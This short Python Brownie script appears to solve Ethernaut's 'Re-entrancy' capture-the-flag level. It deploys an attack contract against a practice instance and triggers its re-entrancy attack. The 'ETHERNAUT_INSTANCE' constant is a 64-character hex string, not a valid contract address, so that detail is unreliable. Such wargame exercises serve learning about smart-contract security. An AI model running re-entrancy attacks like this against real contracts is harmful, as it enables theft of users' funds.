from scripts.helpful_scripts import get_account
from brownie import web3, Attack10, interface

ETHERNAUT_INSTANCE = (
    "0x2631149b0c36a4a0fff2fdefb6de1d467a2b0a0281dca99802c9cd04c1c46b55"
)
AMOUNT = "0.01 ether"
GAS_LIMIT = 6000000


def main():

    player = get_account()
    target = interface.ReentrantInterface(ETHERNAUT_INSTANCE)
    attack = Attack10.deploy(ETHERNAUT_INSTANCE, AMOUNT, {"from": player})

    # print(f"\nre-entrancy attack successfully deployed\n")

    tx = attack.attack({"from": player, "allow_revert": True, "gas_limit": GAS_LIMIT})
    print(f"\n{tx}\n")
